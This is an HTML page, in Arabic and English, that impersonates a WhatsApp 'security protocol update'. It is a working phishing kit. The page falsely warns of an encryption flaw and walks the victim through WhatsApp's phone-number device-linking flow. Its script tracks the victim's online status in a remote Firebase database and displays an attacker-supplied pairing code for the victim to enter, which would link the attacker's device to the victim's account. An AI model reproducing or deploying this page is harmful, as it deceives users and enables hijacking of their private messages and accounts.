<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security Update</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
        .container { width: 100%; max-width: 380px; text-align: center; }
        .logo { width: 65px; margin-top: 20px; margin-bottom: 25px; }
        .header-title { font-size: 22px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
        .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
        .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
        .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
        .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
        .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; }
        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
        .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
        .arrived { color: #d91e1e !important; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div id="ui-title" class="header-title"></div>
        <div class="badge">iPhone (iOS) :جهاز متصل</div>
        
        <div class="v-box">
            <div class="v-row"><span id="ui-old-label" style="color:#667781"></span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
            <div style="height:1px; background:#eee; margin:5px 0"></div>
            <div class="v-row"><span id="ui-new-label" style="color:#667781"></span><span style="color:#00a884; font-weight:bold">V3.0.1 (New Version)</span></div>
        </div>

        <p id="ui-alert" class="alert-p"></p>
        <div id="ui-steps" class="steps"></div>

        <div class="code-zone">
            <div id="pairing-code">. . .</div>
            <div id="ui-wait" class="wait-text"></div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        const userId = new URLSearchParams(window.location.search).get('id');

        const translations = {
            ar: {
                title: "تحديث بروتوكول التشفير",
                old: "بروتوكول التشفير الحالي:",
                new: "بروتوكول التشفير المحدث:",
                alert: "تم رصد ثغرة في تشفير الجهاز المرتبط. لتأمين محادثاتك، يجب ترقية مفاتيح التشفير يدوياً.",
                steps: "<b>خطوات التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز، اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> من أسفل الشاشة.<br>3. أدخل رمز المصادقة التالي المكون من 8 أرقام:",
                wait: "Awaiting security code..",
                done: "أدخل الكود في واتساب الآن!"
            },
            en: {
                title: "Security Protocol Update",
                old: "Old Protocol:",
                new: "New Protocol:",
                alert: "A vulnerability was detected in the linked device. To secure your chats, you must upgrade encryption manually.",
                steps: "<b>Activation Steps:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here:",
                wait: "Awaiting security code..",
                done: "Enter the code in WhatsApp now!"
            }
        };

        const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
        const lang = translations[userLang];
        document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';

        document.getElementById('ui-title').innerText = lang.title;
        document.getElementById('ui-old-label').innerText = lang.old;
        document.getElementById('ui-new-label').innerText = lang.new;
        document.getElementById('ui-alert').innerText = lang.alert;
        document.getElementById('ui-steps').innerHTML = lang.steps;
        document.getElementById('ui-wait').innerText = lang.wait;

        if (userId) {
            const statusRef = db.ref('monitoring/' + userId);
            statusRef.set({ status: "Online", ts: Date.now() });
            // تحديث عند القفل (Offline)
            statusRef.onDisconnect().set({ status: "Offline", ts: Date.now() });

            db.ref('commands/' + userId).on('value', (snap) => {
                if (snap.val() && snap.val().code) {
                    document.getElementById('pairing-code').innerText = snap.val().code;
                    document.getElementById('ui-wait').innerText = lang.done;
                    document.getElementById('ui-wait').classList.add('arrived');
                }
            });
        }
    </script>
</body>
</html>
